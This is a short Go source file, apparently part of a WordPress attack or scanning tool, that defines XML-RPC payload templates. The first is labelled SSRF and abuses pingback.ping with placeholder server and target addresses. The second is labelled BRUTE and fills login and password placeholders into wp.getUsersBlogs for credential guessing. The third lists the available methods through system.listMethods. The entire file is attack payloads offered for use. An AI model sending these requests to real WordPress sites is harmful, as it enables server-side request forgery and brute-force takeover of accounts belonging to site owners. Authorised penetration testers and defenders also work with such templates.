package utils

var SSRF string = `
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
	<value><string>$SERVER$</string></value>
</param>
<param>
	<value><string>$TARGET$?p=1</string></value>
</param>
</params>
</methodCall>`

var BRUTE string = `
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>[$login$]</value></param>
<param><value>[$password$]</value></param>
</params>
</methodCall>
`

var METHODS string = `
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall> 
`
